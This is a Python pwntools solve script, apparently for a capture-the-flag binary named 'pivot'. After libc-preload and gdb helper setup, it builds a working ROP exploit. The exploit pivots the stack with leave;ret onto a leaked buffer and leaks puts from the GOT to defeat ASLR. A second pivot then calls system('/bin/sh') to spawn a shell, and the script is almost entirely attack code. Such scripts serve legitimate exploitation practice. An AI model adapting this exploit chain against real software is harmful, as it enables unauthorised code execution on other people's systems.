#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
import os
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

_CACHED_LIBC_PATH = None
def get_preloadable_libc(path=None, libc_paths=[]):
    """
    Recursively search the working directory for libc
    """
    global _CACHED_LIBC_PATH
    if _CACHED_LIBC_PATH is not None:
        return _CACHED_LIBC_PATH
    if path is None:
        path = os.getcwd()
    for root, dirs, files in os.walk(path):
        for f in files:
            # match common libc-2.31.so and libc.so.6 formats
            match = re.search(r'libc(\.so\.6|-\d+\.\d+\.so)', f)
            if match is not None:
                libc_paths.append(os.path.join(root, f))

    if len(libc_paths) > 0:
        return libc_paths[0]
    return None

# this variable will be filled in with an `ELF` object if
# there is a libc in the same directory as (or child directories of) the script
libc = None
script_directory = os.path.dirname(os.path.abspath(__file__))
LIBC_PATH = get_preloadable_libc(path=script_directory)
if libc is None and LIBC_PATH is not None:
    libc = ELF(LIBC_PATH)
    binsh_offset = libc.data.find(b'/bin/sh')
    if binsh_offset != -1:
        libc.sym['binsh'] = libc.offset_to_vaddr(binsh_offset)

    # libc.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
binary = context.binary = ELF('pivot')


def attach_gdb(p, commands=None):
    """Template to run GDB with predefined commands on a process."""
    val = """
    b *vuln+78
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, gdbscript=None, force_unbuffered=False,
             skip_libc_preload=False,
             preload_libs=None, ld_libpath_cwd=False):
    """
    Start a new process with predefined debug operations.
    @start_gdb: start GDB on process start up
    @gdbscript: default gdbscript to use
    @force_unbuffered: force input to be unbuffered. Use this if outputs arent
                       getting back to you but the program is sending them,
                       or if there is just general input/output weirdness
    @skip_libc_preload: By default this script will attempt to LD_PRELOAD any
                        libc.so.6 (or other libc). If this behavior is not
                        what you want, you can disable it by setting this
                        to True
    @preload_libs: If you would like to preload additional libraries, pass a
                   list of their paths here
   @ld_libpath_cwd: Often, binaries are meant for a different OS version or
                    different distribution of Linux entirely from your current
                    one. If you wish to run them without setting up a docker
                    container you can do so by extracting the desired libraries
                    from a docker container (`get_docker_libs.sh` helps)
                    then patching your binary with
                    patchelf --set-interpreter "<ld-interpreter>" "<binary>"
                    and setting this variable. This is exceptionally overkill,
                    but prevents you from having to debug/test through a docker
                    container, which is a bit of a pain
    """
    kwargs = {}
    kwargs["env"] = {}
    # if there is a libc in the current directory
    global LIBC_PATH
    if skip_libc_preload is False:
        if LIBC_PATH is not None:
            if preload_libs:
                preload_libs.append(LIBC_PATH)
            else:
                preload_libs = [LIBC_PATH]
    if preload_libs:
        cwd = os.getcwd()
        preload_libs = [os.path.join(cwd, i) if not i.startswith("/") else i
                        for i in preload_libs]
        ld_preload = kwargs['env'].get('LD_PRELOAD')
        if ld_preload:
            ld_preload = ld_preload.split(" ")
        else:
            ld_preload = []
        ld_preload.extend(preload_libs)
        kwargs['env']['LD_PRELOAD'] = " ".join(ld_preload)

    if ld_libpath_cwd:
        kwargs['env']['LD_LIBRARY_PATH'] = os.getcwd()

    if force_unbuffered is True:
        kwargs['stdin'] = process.PTY
        kwargs['stdout'] = process.PTY

    p = process(binary.path, **kwargs)
    if start_gdb is True:
        attach_gdb(p, gdbscript)
    return p


p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('localhost', 8000)

binsh_offset = libc.data.find(b'/bin/sh')
if binsh_offset != -1:
    libc.sym['binsh'] = libc.offset_to_vaddr(binsh_offset)

# do leak / payload gen here
r = ROP(binary)
ret = [k for k, v in r.gadgets.items() if v.insns == ['ret']][0]
leave_ret = [k for k, v in r.gadgets.items() if v.insns == ['leave', 'ret']][0]
pop_rdi = [k for k, v in r.gadgets.items() if v.insns == ['pop rdi', 'ret']][0]


p.recvuntil(b'A gift:')
prompt = p.recvuntil(b'\n')
m = re.search(b'(0x[0-9a-f]+)', prompt)
pivot_addr = int(m.groups()[0], 16)


chain_offset = 0

leak_payload = flat({
    chain_offset: [
        ret,
        pop_rdi,
        binary.sym['got.puts'],
        binary.sym['plt.puts'],
        binary.sym['main']
       ]
})

p.send(leak_payload)

pivot_payload = b'J'*32 + p64(pivot_addr+chain_offset-8) + p64(leave_ret)

# trigger pivot payload to jump to leak payload
p.sendafter(b"give me your message: ", pivot_payload)

leak_bytes = p.recvuntil(b'\n')
leak_bytes = leak_bytes[:leak_bytes.find(b'\n')].ljust(8, b'\x00')
libc_leak = u64(leak_bytes)

log.success("leak %#x" % libc_leak)

# leak payload restarts main, so re-trigger bug to do a second pivot

libc.address = libc_leak - libc.sym['puts']

p.recvuntil(b'A gift:')
prompt = p.recvuntil(b'\n')
m = re.search(b'(0x[0-9a-f]+)', prompt)
new_pivot_addr = int(m.groups()[0], 16)


exec_payload = flat([
    pop_rdi,
    libc.sym['binsh'],
    libc.sym['system'],
    binary.sym['main'],
])

p.send(exec_payload)

new_pivot_payload = b'J'*32 + p64(new_pivot_addr-8) + p64(leave_ret)

p.sendafter(b"give me your message: ", new_pivot_payload)

